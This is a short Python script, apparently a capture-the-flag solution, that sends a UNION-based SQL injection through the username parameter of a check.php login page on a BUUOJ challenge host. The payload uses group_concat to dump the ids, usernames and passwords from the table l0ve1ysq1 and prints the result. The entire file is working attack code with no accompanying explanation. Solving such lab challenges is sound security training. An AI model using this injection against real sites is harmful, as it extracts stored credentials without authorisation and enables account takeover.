import requests
url = "http://93565404-c915-403e-b04a-0c75283d2fdd.node4.buuoj.cn:81"
payload = f"/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1"
res = requests.get(url = url + payload)
print(res.text)

